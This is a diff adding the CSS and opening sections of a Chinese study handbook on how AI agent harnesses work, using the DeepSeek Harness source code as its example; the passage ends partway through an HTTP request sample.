+    .doc-chrome { padding-top: 76px; }  /* the fixed TOC button (24 + 40px) sits over the left margin */
+    .section-number { font-size: 14px; font-weight: 500; color: var(--accent-ink, var(--accent)); letter-spacing: 0.14em; }
+    .hero-cover .hero-bg { height: 360px; }
+    .hero-cover h1 { font-size: 2.4rem; }
+    .def-card-swiss { grid-template-columns: 1fr; gap: var(--sp-3); }
+    .gallery-grid { grid-template-columns: 1fr; }
+  }
+
+  @media (max-width: 1000px) {
+    .doc-chrome { grid-template-columns: 1fr; grid-template-areas: "bar" "tags" "meta"; }
+    .doc-chrome > .doc-chrome-meta { justify-self: start; }
+    .pullquote-swiss, .highlight-swiss { grid-template-columns: minmax(0,1fr); }
+  }
+
+  @media (max-width: 760px) {
+    .img-row-3 { grid-template-columns: 1fr 1fr; }
+    .img-strip .figure-card { flex-basis: 85%; }
+  }
+
+  @media (max-width: 640px) {
+    html, body { overflow-x: hidden; }
+    .container { padding: 0 var(--sp-6); }
+    /* chrome: wraps instead of overflowing; top padding clears the fixed TOC button */
+    .doc-chrome { padding-top: 72px; row-gap: 14px; }
+    .doc-chrome > .doc-chrome-bar { flex-wrap: wrap; gap: 6px 12px; padding: 12px 14px; font-size: var(--fs-meta); letter-spacing: .1em; margin-bottom: 0; }
+    .doc-chrome-bar .chrome-l, .doc-chrome-bar .chrome-r { gap: .8em; flex-wrap: wrap; min-width: 0; }
+    .doc-chrome-bar .chrome-sep { width: 14px; }
+    .doc-chrome-meta { gap: 6px 1.2em; font-size: var(--fs-meta); letter-spacing: .08em; }
+    .doc-chrome-meta .cm-dot { display: none; }
+    .doc-chrome-meta .cm-item { min-width: 0; flex-wrap: wrap; }
+    .doc-chrome-tags { gap: 6px; }
+    .doc-chrome-tags .chrome-tag { padding: 3px 10px; font-size: var(--fs-meta); }
+    /* hero: image on top, text below on the dark block (no overlay clipping) */
+    .hero-cover { display: flex; flex-direction: column; overflow: visible; }
+    .hero-cover::before { bottom: auto; height: 220px; }
+    .hero-cover .hero-bg { height: 220px; opacity: .55; }
+    .hero-cover .hero-overlay { position: relative; inset: auto; padding: 22px 20px 26px; }
+    .hero-cover h1, :lang(zh) .hero-cover h1 { font-size: 1.75rem; line-height: 1.28; letter-spacing: -0.01em; margin-bottom: 14px; overflow-wrap: anywhere; }
+    .hero-cover .hero-subtitle { font-size: .95rem; line-height: 1.7; color: rgba(var(--paper-rgb), .78); }
+    .hero-cover .hero-kicker { margin-bottom: 12px; }
+    .section-header .section-number { font-size: 24px; }
+    .pullquote-swiss .pq-content p { font-size: 1.2rem; }
+    .hc-row { grid-template-columns: 1fr; }
+  }
+
+  /* ══════════════════════════════════════
+     PRINT (shared pagination rules live in ui.css)
+     ══════════════════════════════════════ */
+  @media print {
+    .hero-cover .hero-bg { filter: brightness(0.4); }
+    .def-card-swiss, .aside-card, .process-step { background: var(--grey-1); }
+    .gallery-grid { grid-template-columns: 1fr 1fr; }
+    a { color: inherit; }
+    /* ui.css print forces img width:auto; stretch keeps the cover image full-bleed */
+    .hero-cover .hero-bg { justify-self: stretch; }
+    /* the rail grid doesn't fit the page: single flow, rail content inline */
+    .pullquote-swiss, .highlight-swiss { display: block; }
+    .pullquote-swiss .pq-bar { display: none; }
+    .section > .figure-card > figcaption { border-top: 0; padding-top: 6px; }
+    .img-strip { overflow: visible; }
+    .img-strip-hint { display: none; }
+  }
+
+  /* ========================================
+     FOOTNOTES — [^n] references and the list at the end
+     ======================================== */
+  sup.fn-ref { font-size: .72em; line-height: 0; margin-left: 1px; }
+  sup.fn-ref a, .fn-back { color: var(--accent-ink); text-decoration: none; }
+  .footnotes li { scroll-margin-top: 80px; }
+
+  /* Phones: diagrams keep a readable size and scroll sideways; table headers don't break inside a word */
+  .table-wrap th { word-break: keep-all; }
+  @media (max-width: 640px) {
+    .embed-body { overflow-x: auto; }
+    .embed-body > svg { min-width: 520px; }
+  }
+</style>
+<style>  /* ══════════════════════════════════════
+     UI OVERLAY — Settings, Share, Edit
+     Shared across all themes
+     ══════════════════════════════════════ */
+
+  /* ── Editable text ── */
+  [contenteditable] {
+    outline: none;
+    cursor: text;
+    transition: background 0.15s;
+    border-radius: 2px;
+  }
+  [contenteditable]:hover {
+    background: rgba(0,0,0,0.03);
+  }
+  [contenteditable]:focus {
+    background: rgba(0,0,0,0.05);
+    box-shadow: 0 0 0 2px var(--accent, #002FA7);
+  }
+
+  /* ── FAB container (bottom-right) ── */
+  .hf-fab {
+    position: fixed;
+    right: 24px;
+    bottom: 24px;
+    z-index: 1000;
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+    align-items: flex-end;
+  }
+
+  .hf-fab-btn {
+    width: 44px; height: 44px;
+    display: flex; align-items: center; justify-content: center;
+    background: var(--fg, #0a0a0a);
+    color: var(--bg, #fafaf8);
+    border: none; border-radius: 0; cursor: pointer;
+    transition: opacity 0.15s;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+  }
+  .hf-fab-btn:hover { opacity: 0.85; }
+  .hf-fab-btn svg { width: 20px; height: 20px; }
+
+  /* ── Dropdown menu (share + settings) ── */
+  .hf-dropdown {
+    position: absolute;
+    background: var(--fg, #0a0a0a);
+    color: var(--bg, #fafaf8);
+    min-width: 220px;
+    padding: 8px 0;
+    box-shadow: 0 4px 24px rgba(0,0,0,0.2);
+    opacity: 0;
+    pointer-events: none;
+    transform: translateY(4px);
+    transition: opacity 0.15s, transform 0.15s;
+    z-index: 210;
+  }
+  .hf-dropdown.open {
+    opacity: 1;
+    pointer-events: auto;
+    transform: translateY(0);
+  }
+  .hf-fab .hf-dropdown { right: 0; bottom: calc(100% + 6px); }
+
+  .hf-dropdown-item {
+    display: flex; align-items: center; gap: 10px;
+    padding: 10px 16px;
+    font-family: var(--font-sans, sans-serif);
+    font-size: 13px; font-weight: 400;
+    cursor: pointer;
+    transition: background 0.1s;
+    border: none; background: none; color: inherit;
+    width: 100%; text-align: left;
+  }
+  .hf-dropdown-item:hover { background: rgba(255,255,255,0.08); }
+  .hf-dropdown-item svg { width: 16px; height: 16px; opacity: 0.5; }
+
+  .hf-dropdown-divider {
+    height: 1px;
+    background: rgba(255,255,255,0.1);
+    margin: 6px 0;
+  }
+
+  .hf-dropdown-label {
+    padding: 8px 16px 4px;
+    font-family: var(--font-mono, monospace);
+    font-size: 9px; font-weight: 700;
+    letter-spacing: 0.18em; text-transform: uppercase;
+    opacity: 0.35;
+  }
+
+  /* ── Color swatches ── */
+  .hf-swatches {
+    display: flex; gap: 6px;
+    padding: 6px 16px 10px;
+  }
+  .hf-swatch {
+    -webkit-appearance: none; appearance: none; padding: 0;
+    width: 28px; height: 28px;
+    border: 2px solid transparent;
+    cursor: pointer;
+    transition: border-color 0.15s;
+    position: relative;
+  }
+  .hf-swatch:hover { border-color: rgba(255,255,255,0.3); }
+  .hf-swatch.active { border-color: var(--bg, #fff); }
+  .hf-swatch.active::after {
+    content: '✓';
+    position: absolute; inset: 0;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 12px; color: #fff;
+    text-shadow: 0 1px 2px rgba(0,0,0,0.4);
+  }
+
+  /* ── Font options ── */
+  .hf-font-options {
+    display: flex; flex-direction: column; gap: 2px;
+    padding: 4px 16px 8px;
+  }
+  .hf-font-option {
+    display: flex; align-items: center; gap: 8px;
+    padding: 6px 8px;
+    font-size: 13px;
+    cursor: pointer;
+    border: none; background: none; color: inherit;
+    width: 100%; text-align: left;
+    transition: background 0.1s;
+  }
+  .hf-font-option:hover { background: rgba(255,255,255,0.08); }
+  .hf-font-option.active { background: rgba(255,255,255,0.12); }
+  .hf-font-option .font-preview {
+    font-size: 15px; font-weight: 300;
+    opacity: 0.7;
+  }
+  .hf-font-option .font-name {
+    font-family: var(--font-mono, monospace);
+    font-size: 10px; letter-spacing: 0.08em;
+    text-transform: uppercase; opacity: 0.4;
+  }
+
+  /* ── Print hide UI ── */
+  @media print {
+    .hf-fab,.toc,.toc-scrim { display: none !important; }
+    [contenteditable] { box-shadow: none !important; background: none !important; }
+  }
+
+  /* ── TOC layout behaviour (shared) ──
+     Root cause of the old "TOC covers half the article" bug: the panel is a
+     280px fixed overlay, while the article container starts ~120px from the
+     left edge on a 1440px screen, so opening it always covered the text.
+     Fix: on wide screens opening the TOC pushes the page (body padding-left),
+     so nothing is covered; on narrow screens it is a drawer with a scrim and
+     closes on outside click / Esc. */
+  .toc { width: 0; height: 0; overflow: visible; pointer-events: none; }
+  .toc-toggle, .toc-panel { pointer-events: auto; }
+  .toc-panel { visibility: hidden; transition: transform 0.25s cubic-bezier(.2,0,.38,.9), visibility 0s linear 0.25s; }
+  .toc-open .toc-panel { visibility: visible; transition: transform 0.25s cubic-bezier(.2,0,.38,.9); }
+  body { transition: padding-left 0.25s cubic-bezier(.2,0,.38,.9); }
+  .toc-scrim { display: none; }
+  @media (min-width: 1025px) {
+    html.toc-is-open body { padding-left: 300px; }
+  }
+  @media (max-width: 1024px) {
+    .toc-scrim {
+      position: fixed; inset: 0; z-index: 99;
+      background: rgba(0,0,0,0.28);
+    }
+    html.toc-is-open .toc-scrim { display: block; }
+    .toc-panel { width: min(300px, 86vw); }
+  }
+
+  /* ══════════════════════════════════════
+     PRINT / PDF — pagination (shared by both styles)
+     Root cause of the "half-empty page" bug: style-magazine.css had
+     `.hero, .section { break-inside: avoid }`, and both themes lay sections
+     out as CSS grids; any chapter taller than the remaining space jumped to
+     the next page whole. Rules now: only small atomic blocks avoid breaking,
+     long containers flow across pages, headings stick to what follows.
+     ══════════════════════════════════════ */
+  /* Page margins live inside the page (container padding repeated on every page via
+     box-decoration-break), so the theme's paper colour fills the whole sheet — Chrome
+     doesn't paint @page margins, which left a white frame around dark themes. */
+  @page { size: A4; margin: 0; }
+  @media print {
+    html, body, body * { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    html { background: var(--bg); }
+    html.toc-is-open body, body { padding-left: 0 !important; }
+    .container { max-width: none !important; padding: 14mm 12mm 16mm !important; -webkit-box-decoration-break: clone; box-decoration-break: clone; }
+    .embed-label, .summary-label, .aside-title { break-after: avoid; }
+    /* grid fragmentation is fragile — flow sections as blocks on paper */
+    .section, .hero, footer, .container > .pullquote { display: block !important; }
+    .section-header { display: block !important; }
+    .section, .hero, .process, .gallery, .gallery-grid, .summary-card,
+    .summary-grid, .table-wrap, table, ul, ol, pre, .chart-row,
+    .embed-card, .data-figure { break-inside: auto !important; }
+
+    /* headings never end a page */
+    h1, h2, h3, h4, h5, .section-number, .section-header, .hero-kicker,
+    .def-card-label, .hl-label, .toc-header { break-after: avoid; break-inside: avoid; }
+    p { orphans: 3; widows: 3; }
+
+    /* small atomic blocks: keep whole */
+    blockquote, .def-card, .def-card-swiss, .highlight-card, .highlight-swiss,
+    .pullquote, .pullquote-swiss, .aside-card, .process-step, .big-number,
+    .summary-item, .gallery-item, li, tr, .callout { break-inside: avoid; }
+
+    /* image + caption travel together; cap height (120mm ≈ 45% of an A4 text area). Residual gap: a heading kept with a big figure can still leave up to ~half a page — intended (no orphan heading). so a figure never strands more than ~half a page */
+    figure, .figure-card { break-inside: avoid; }
+    figure img, .figure-card img, img { max-height: 120mm; width: auto; max-width: 100%; object-fit: contain; }
+    figcaption, .figure-caption, .caption { break-before: avoid; }
+    pre { white-space: pre-wrap; word-break: break-all; }
+    .section { padding-top: 12mm !important; padding-bottom: 4mm !important; }
+    a { text-decoration: none; }
+  }
+
+  /* ══════════════════════════════════════
+     PRINT v0.14 — blank-space budget (≤25% per page)
+     A block that can't split leaves at most its own height as a gap, so every
+     unsplittable block is capped well under a quarter page; everything tall
+     (tables, charts, quotes) is allowed to split. Screen layout untouched.
+     ══════════════════════════════════════ */
+  @media print {
+    .section { padding-top: 5mm !important; padding-bottom: 2mm !important; margin-top: 0 !important; border: 0 !important; }
+    .section::before { content: none !important; }
+    .section > .section-number { margin-bottom: 2mm !important; }
+    .section h2, .section-header { margin-bottom: 4mm !important; }
+    .hero { padding-top: 0 !important; padding-bottom: 4mm !important; }
+    .hero::after { margin-top: 3mm !important; }
+    .doc-chrome { padding-top: 0 !important; padding-bottom: 4mm !important; }
+    .hero-cover, .hero-cover .hero-bg { min-height: 0 !important; height: 60mm !important; }
+
+    /* media: shrink to fit instead of jumping */
+    figure img, .figure-card img, .img-row img, .img-strip img, img { max-height: 58mm !important; width: auto !important; max-width: 100% !important; object-fit: contain !important; margin-left: auto; margin-right: auto; }
+    .img-row img { max-height: 42mm !important; }
+    .media-embed video, .media-embed iframe { max-height: 58mm !important; }
+    figure, .figure-card { margin-top: 3mm !important; margin-bottom: 3mm !important; }
+    .figure-card > figcaption { margin-top: 1.5mm !important; text-align: center; }  /* images shrink and centre on paper */
+
+    /* headings stay with the next *line*, not with a whole big block */
+    h2, h3, .section-header, .section-number { break-after: avoid; }
+    .section-header + .figure-card, h2 + .figure-card, .section-number + h2 + .figure-card,
+    h2 + .table-wrap, h2 + .hchart, .section-header + .hchart, .section-header + .table-wrap { break-before: auto !important; }
+
+    /* tables: split across pages, header row repeats */
+    .table-wrap, .table-wrap table { break-inside: auto !important; overflow: visible !important; }
+    .table-wrap thead { display: table-header-group; }
+    .table-wrap tr { break-inside: avoid; }
+    .table-caption { break-after: avoid; }
+
+    /* charts: allowed to split between rows/groups */
+    .hchart { break-inside: auto !important; padding-top: 4mm !important; padding-bottom: 4mm !important; margin-top: 4mm !important; margin-bottom: 4mm !important; }
+    .hc-row, .hc-group, .hc-legend { break-inside: avoid; }
+    .hc-title, .hc-legend { break-after: avoid; }
+
+    /* quotes / cards may split when long; small ones still stay whole via orphans/widows */
+    blockquote, .pullquote, .pullquote-swiss, .highlight-card, .highlight-swiss { break-inside: auto !important; }
+    .pullquote, .pullquote-swiss { padding-top: 5mm !important; padding-bottom: 5mm !important; margin-top: 4mm !important; margin-bottom: 4mm !important; }
+    .img-row, .img-strip-wrap { margin-top: 3mm !important; margin-bottom: 3mm !important; }
+    p { orphans: 2; widows: 2; }
+  }
+  @media print {
+    figure img, .figure-card img, img { max-height: 54mm !important; }
+    .img-strip { display: grid !important; grid-template-columns: repeat(3, 1fr); gap: 3mm; }
+    .img-strip .figure-card { flex: none !important; }
+    .img-strip img, .img-row img { max-height: 34mm !important; }
+  }
+  @media print {
+    /* heading followed directly by an unsplittable media block: don't drag the heading along */
+    .section-header:has(+ .figure-card), .section-header:has(+ .img-row), .section-header:has(+ .media-embed),
+    h2:has(+ .figure-card), h2:has(+ .img-row), h2:has(+ .media-embed),
+    .section-number:has(+ h2 + .figure-card) { break-after: auto !important; }
+  }
+  @media print { figure img, .figure-card img, img { max-height: 50mm !important; } .section-header .section-number { font-size: 20px !important; } }
+  @media print { .section-header + .figure-card img, h2 + .figure-card img { max-height: 38mm !important; } }
+  @media print { .section-header .section-number { display: inline-block !important; margin: 0 4mm 0 0 !important; } .section-header h2 { display: inline !important; } .section-header { margin-bottom: 3mm !important; } .figure-card { margin-top: 2mm !important; } }
+  @media print { h3 + .figure-card img { max-height: 38mm !important; } .hc-group { padding: 2mm 0 !important; } .hc-group .hc-bar { height: 10px !important; } .hc-bars { gap: 3px !important; } .hc-legend { margin-bottom: 3mm !important; } .hc-title { margin-bottom: 3mm !important; } .hc-row { padding: 1mm 0 !important; } .hc-bar { height: 13px !important; } }
+</style>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" data-gz-fonts="inter noto-sans-sc jetbrains-mono" href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&family=Noto+Sans+SC:wght@100..900&family=JetBrains+Mono:wght@100..800&display=swap">
+<style id="pm-style">
+.pm-card{margin:1.5em 0 2.2em;background:var(--grey-1);border-radius:0;overflow:hidden}
+.pm-sum{display:flex;align-items:center;gap:14px;padding:13px 18px;cursor:pointer;list-style:none;
+  transition:background .16s ease}
+.pm-sum::-webkit-details-marker{display:none}
+.pm-sum::marker{content:''}
+.pm-sum:hover{background:rgba(var(--ink-rgb),.05)}
+.pm-sum:focus-visible{outline:2px solid var(--accent);outline-offset:-2px}
+.pm-tag{flex:none;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:10px;
+  letter-spacing:.12em;color:var(--accent);border:1px solid currentColor;padding:3px 7px;line-height:1}
+.pm-lead{font-size:13.5px;color:var(--text-secondary);line-height:1.4}
+.pm-plus{margin-left:auto;flex:none;font-size:15px;color:var(--text-helper);transition:transform .2s ease}
+.pm-card[open] .pm-plus{transform:rotate(45deg)}
+.pm-card[open] .pm-sum{background:rgba(var(--ink-rgb),.03)}
+.pm-body{display:grid;gap:11px;padding:2px 18px 18px;animation:pmFade .2s ease}
+@keyframes pmFade{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:none}}
+.pm-row{display:grid;grid-template-columns:56px 1fr;gap:14px;align-items:baseline}
+.pm-k{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:10.5px;letter-spacing:.06em;
+  color:var(--text-helper);text-transform:none}
+.pm-v{font-size:14px;line-height:1.72;color:var(--text-secondary)}
+@media (max-width:720px){.pm-row{grid-template-columns:1fr;gap:2px}.pm-lead{font-size:12.5px}}
+@media print{.pm-card{break-inside:avoid}.pm-body{display:grid!important}
+  .pm-plus{display:none}}
+</style>
+</head>
+<body>
+
+<div class="toc-scrim" id="toc-scrim"></div>
+<nav class="toc" id="toc">
+  <button class="toc-toggle" id="toc-toggle" aria-label="Toggle table of contents">
+    <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><path d="M2 4h14M2 9h10M2 14h14" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
+  </button>
+  <div class="toc-panel" id="toc-panel">
+    <div class="toc-header">目录</div>
+    <a class="toc-item" href="#s-01"><span class="toc-num">01</span>读前须知：这份文档假设你会什么</a>
+<a class="toc-item" href="#s-02"><span class="toc-num">02</span>0 · 先给结论：agent 开发到底在开发什么</a>
+<a class="toc-item" href="#s-03"><span class="toc-num">03</span>1 · 地基：LLM 是一个无状态函数</a>
+<a class="toc-item" href="#s-04"><span class="toc-num">04</span>2 · 最小 agent 循环：20 行伪代码</a>
+<a class="toc-item" href="#s-05"><span class="toc-num">05</span>3 · Harness 到底要补哪十件事</a>
+<a class="toc-item" href="#s-06"><span class="toc-num">06</span>4 · 教材概览：DSH 是个什么样的项目</a>
+<a class="toc-item" href="#s-07"><span class="toc-num">07</span>5 · 地基框架 Cordis：五个概念撑起整个项目</a>
+<a class="toc-item" href="#s-08"><span class="toc-num">08</span>6 · 装配：产品是被一份份 YAML 拼出来的</a>
+<a class="toc-item" href="#s-09"><span class="toc-num">09</span>7 · 主链路总览：一次回车之后发生了什么</a>
+<a class="toc-item" href="#s-10"><span class="toc-num">10</span>8 · 会话日志：整个系统的唯一真相</a>
+<a class="toc-item" href="#s-11"><span class="toc-num">11</span>9 · 轮次与步骤：循环的状态机</a>
+<a class="toc-item" href="#s-12"><span class="toc-num">12</span>10 · 系统提示词：给模型看的“岗位说明书”</a>
+<a class="toc-item" href="#s-13"><span class="toc-num">13</span>11 · 模型调用层：一个“能力缝”的完整例子</a>
+<a class="toc-item" href="#s-14"><span class="toc-num">14</span>12 · 工具：agent 的双手</a>
+<a class="toc-item" href="#s-15"><span class="toc-num">15</span>13 · 结果回灌：上下文是这样被撑爆的</a>
+<a class="toc-item" href="#s-16"><span class="toc-num">16</span>14 · 上下文管理：压缩不是“删除”，是“换书”</a>
+<a class="toc-item" href="#s-17"><span class="toc-num">17</span>15 · 持久化与恢复：崩溃之后还能接着干</a>
+<a class="toc-item" href="#s-18"><span class="toc-num">18</span>16 · 安全边界：三道护栏，和一条诚实的边界</a>
+<a class="toc-item" href="#s-19"><span class="toc-num">19</span>17 · 委派：让 agent 学会“叫别人干”</a>
+<a class="toc-item" href="#s-20"><span class="toc-num">20</span>18 · 扩展面：能力是怎么长出来的</a>
+<a class="toc-item" href="#s-21"><span class="toc-num">21</span>19 · 前端：为什么 agent 产品都需要一个“壳”</a>
+<a class="toc-item" href="#s-22"><span class="toc-num">22</span>20 · 迁移清单：任何 agent 项目都有的 12 个模块</a>
+<a class="toc-item" href="#s-23"><span class="toc-num">23</span>21 · 怎么读这类代码：四条方法论</a>
+<a class="toc-item" href="#s-24"><span class="toc-num">24</span>22 · 两周学习路线（不用写代码）</a>
+<a class="toc-item" href="#s-25"><span class="toc-num">25</span>术语表</a>
+<a class="toc-item" href="#s-26"><span class="toc-num">26</span>附录：这个项目对自己的十条要求</a>
+<a class="toc-item" href="#s-27"><span class="toc-num">27</span>写在最后</a>
+  </div>
+</nav>
+<div class="container">
+
+<div class="doc-chrome">
+  <div class="doc-chrome-bar">
+    <div class="chrome-l">
+      <span class="chrome-accent">学习手册</span>
+      <span class="chrome-sep"></span>
+      <span>基于 DSH 0.2.2-RC.1 源码分析</span>
+    </div>
+    <div class="chrome-r">
+      <span>归藏 Page</span>
+      <span class="chrome-sep"></span>
+      <span>2026.11.10</span>
+    </div>
+  </div>
+  <div class="doc-chrome-rule"></div>
+  <div class="doc-chrome-meta">
+    <div class="cm-item"><span class="cm-key">author</span> <span class="cm-val">源码解析整理</span></div><div class="cm-dot"></div><div class="cm-item"><span class="cm-key">date</span> <span class="cm-val">2026.11.10</span></div><div class="cm-dot"></div><div class="cm-item"><span class="cm-key">reading</span> <span class="cm-val">约 45 分钟</span></div>
+  </div>
+  <div class="doc-chrome-tags"><span class="chrome-tag">Agent 开发</span><span class="chrome-tag">LLM</span><span class="chrome-tag">源码阅读</span><span class="chrome-tag">DeepSeek Harness</span></div>
+</div>
+
+<header class="hero hero-cover">
+  <img class="hero-bg" src="https://images.unsplash.com/photo-1509023464722-18d996393ca8?w=1400&h=600&fit=crop" alt="" />
+  <div class="hero-overlay">
+    <div class="hero-kicker">学习手册 — 2026.11.10</div>
+    <h1>从一个 LLM 调用，到一个能交付的 Agent</h1>
+    <p class="hero-subtitle">以 DeepSeek Harness 源码为教材，把 agent 开发的全链路拆开讲一遍</p>
+  </div>
+</header>
+<section class="section" id="s-01"><div class="section-header"><div class="section-number">01</div><h2>读前须知：这份文档假设你会什么</h2></div><details class="pm-card"><summary class="pm-sum"><span class="pm-tag">产品经理视角</span><span class="pm-lead">定位与预期</span><span class="pm-plus" aria-hidden="true">＋</span></summary><div class="pm-body"><div class="pm-row"><span class="pm-k">谁的痛</span><div class="pm-v">0 基础的人打开 53 万行的仓库，五分钟就会关掉</div></div><div class="pm-row"><span class="pm-k">怎么解</span><div class="pm-v">先给结论和地图，再给细节；先回答「我读完能干什么」</div></div><div class="pm-row"><span class="pm-k">代价</span><div class="pm-v">牺牲完整性，换「读完一章就有获得感」</div></div><div class="pm-row"><span class="pm-k">可迁移</span><div class="pm-v">技术文档的第一屏应该是收益承诺，不是目录</div></div></div></details><p>假设你<strong>会一点命令行、知道什么是 API</strong>，但对“agent 到底是怎么跑起来的”没有概念。你不需要会写 TypeScript，也不需要手搓代码。因为这份文档的目标不是让你复现一个 agent，而是让你<strong>看一个真实的、工业级的 agent 产品时，知道它在干什么、为什么要这么干、各部分的边界在哪里</strong>。</p>
+<p>教材是 DeepSeek 开源的 <a href="https://github.com/deepseek-ai/deepseek-harness">DeepSeek Harness</a>（下称 DSH）。它是一个 agent harness，用大白话说：<strong>它把“一个只会聊天的模型”包装成“一个能读你的代码、能跑命令、能开子任务、能记住上次进度、能管住自己别把你硬盘删了”的工具。</strong></p>
+<p>选它当教材有三个理由：它是真的有人在用的产品（不是玩具 demo）；它的架构划分异常干净；它把自己的设计文档写进了仓库，你可以对照文档和代码互相验证<span class="dash">——</span>这是一种很好的学习习惯。</p>
+<p>读的时候有三点约定：</p>
+<ol><li><strong>每节标题下面有一张折叠的「产品经理视角」卡片</strong>，点一下才展开。里面是这一节在设计上赌了什么<span class="dash">——</span>谁的痛、怎么解、代价是什么、能迁移到你自己项目上的判断。先读正文再看它，收获更大。</li><li><strong>文中的代码块是最小示意，不是可直接编译的完整实现。</strong> 目的是让你看清“一行代码对应哪个机制”，真实签名请对照仓库源码（每节都给了路径）。</li><li><strong>关键数字都是实测或读源码得来的</strong>，不是估算；唯一例外是那张代码量分布图，它标了统计口径。</li></ol>
+<div class="def-card def-card-swiss"><div class="dc-term"><span class="dc-label">术语</span>Harness</div><div class="dc-body">马具、挽具。这个词在 AI 工程里指“套在模型外面的那套装置”。模型本身只会输出文字，harness 负责把文字变成动作、把动作的结果喂回去、并保证整个过程中数据不丢、权限不越界。</div></div></section><section class="section" id="s-02"><div class="section-header"><div class="section-number">02</div><h2>0 · 先给结论：agent 开发到底在开发什么</h2></div><details class="pm-card"><summary class="pm-sum"><span class="pm-tag">产品经理视角</span><span class="pm-lead">先破除误解</span><span class="pm-plus" aria-hidden="true">＋</span></summary><div class="pm-body"><div class="pm-row"><span class="pm-k">谁的痛</span><div class="pm-v">用户把「模型会思考」当事实，于是误解幻觉、误解循环</div></div><div class="pm-row"><span class="pm-k">怎么解</span><div class="pm-v">第一屏就拆掉这个心智模型：模型不循环，循环是程序写的</div></div><div class="pm-row"><span class="pm-k">代价</span><div class="pm-v">反直觉，必须马上给证据，否则读者会觉得被冒犯</div></div><div class="pm-row"><span class="pm-k">可迁移</span><div class="pm-v">好文档敢先纠正用户的错误前提，而不是顺着说</div></div></div></details><p>如果只能记一句话，请记这句：</p>
+<div class="pullquote pullquote-swiss"><div class="pq-bar"></div><div class="pq-content"><p>模型不<span class="accent-mark">循环</span>，循环是外面那层程序写的。</p></div></div>
+<p>你在聊天框里跟模型对话时，感觉它在“思考—行动—再思考”。实际上没有。模型是一个无状态的函数：你给它一段文字（messages），它吐一段文字回来，结束。它不记得上一次、不知道时间、不能读文件、不会自己重试。</p>
+<p>所谓 agent，是外面这一层程序反复做同一件事：<strong>把“当前该让模型看到的所有东西”拼成一段上下文 → 调模型 → 如果模型说“我要用工具”，就去执行工具、把结果塞进上下文 → 再调一次模型</strong>。循环到模型不再要工具为止。</p>
+<p>同一句需求，两种命运：</p>
+<pre><code class="language-text"># 裸调模型：它只回一段文字，什么也没做
+用户：看看 src/app.ts 为啥报错
+模型：建议检查第 42 行是否存在空值。        ← 它没读过那个文件
+
+# 走一遍循环：它真的去看了
+用户：看看 src/app.ts 为啥报错
+模型：我要调用 read({ path: &quot;src/app.ts&quot; })  ← 这是「意图」，不是答案
+harness：执行工具，把文件内容塞回上下文
+模型：第 42 行 user 可能为 null，建议加可选链。  ← 这才是答案</code></pre>
+<p>区别只在于：<strong>多了一个 while 循环，和一套能执行工具的基础设施。</strong></p>
+<p>那一个 agent 产品的工程量到底花在哪？我按这个仓库的实际代码量统计了一遍：</p>
+<figure class="hchart"><div class="hc-title">一个 agent 产品里，代码到底花在哪</div><div class="hc-body"><div class="hc-row hc-hi"><div class="hc-label">client（浏览器界面）</div><div class="hc-bars"><div class="hc-bar hc-hi"><span class="hc-fill" style="width:98.33%"></span><span class="hc-val">177k 行</span></div></div></div><div class="hc-row"><div class="hc-label">api（前后端 RPC）</div><div class="hc-bars"><div class="hc-bar "><span class="hc-fill" style="width:12.78%"></span><span class="hc-val">23k 行</span></div></div></div><div class="hc-row"><div class="hc-label">session（日志与持久化）</div><div class="hc-bars"><div class="hc-bar "><span class="hc-fill" style="width:10.56%"></span><span class="hc-val">19k 行</span></div></div></div><div class="hc-row"><div class="hc-label">llm（模型接入）</div><div class="hc-bars"><div class="hc-bar "><span class="hc-fill" style="width:8.33%"></span><span class="hc-val">15k 行</span></div></div></div><div class="hc-row"><div class="hc-label">core（循环/工具/提示词）</div><div class="hc-bars"><div class="hc-bar "><span class="hc-fill" style="width:8.33%"></span><span class="hc-val">15k 行</span></div></div></div><div class="hc-row"><div class="hc-label">boot（启动与装配）</div><div class="hc-bars"><div class="hc-bar "><span class="hc-fill" style="width:7.22%"></span><span class="hc-val">13k 行</span></div></div></div></div><figcaption class="hc-cap">来源：统计 packages/<em lang="en">/</em>/src 下 .ts/.tsx（不含测试），dsh 0.2.2-rc.1</figcaption></figure>
+<p>看到没有：<strong>浏览器界面的代码量，是 agent 内核（core）的十二倍</strong>。core 里装着 agent 循环、工具注册表、系统提示词<span class="dash-em"><span class="dash">——</span>也就是“agent”这三个字最核心的那部分<span class="dash">——</span></span>但它只占整个代码库的百分之三。</p>
+<p>这不是 DSH 的特殊情况，是所有 agent 产品的共性：<strong>模型调用那几百行谁都能写，真正吃人力的是它周边的一切</strong><span class="dash">——</span>界面怎么把流式内容画出来、状态存在哪、崩了怎么恢复、工具输出太大怎么办、模型跑飞了怎么停、怎么让它别删库、怎么让它开十个子任务又不互相污染。</p>
+<p>这份文档就按这条线走。</p></section><section class="section" id="s-03"><div class="section-header"><div class="section-number">03</div><h2>1 · 地基：LLM 是一个无状态函数</h2></div><details class="pm-card"><summary class="pm-sum"><span class="pm-tag">产品经理视角</span><span class="pm-lead">成本与约束</span><span class="pm-plus" aria-hidden="true">＋</span></summary><div class="pm-body"><div class="pm-row"><span class="pm-k">谁的痛</span><div class="pm-v">用了三个月才发现「它记不住」和「越长越贵」</div></div><div class="pm-row"><span class="pm-k">怎么解</span><div class="pm-v">把三条铁律前置成产品约束：无记忆、按量计费、只能追加</div></div><div class="pm-row"><span class="pm-k">代价</span><div class="pm-v">把实现细节暴露给使用者，增加认知负担</div></div><div class="pm-row"><span class="pm-k">可迁移</span><div class="pm-v">成本模型要写进产品说明，否则用户会以为「越长越聪明」</div></div></div></details><p>先把最容易被教程含糊过去的一件事说清楚。</p>
+<p>一次模型调用，本质是一次 HTTP 请求：</p>
+<pre><code class="language-text">POST /chat/completions
+{
+  &quot;model&quot;: &quot;deepseek-chat&quot;,
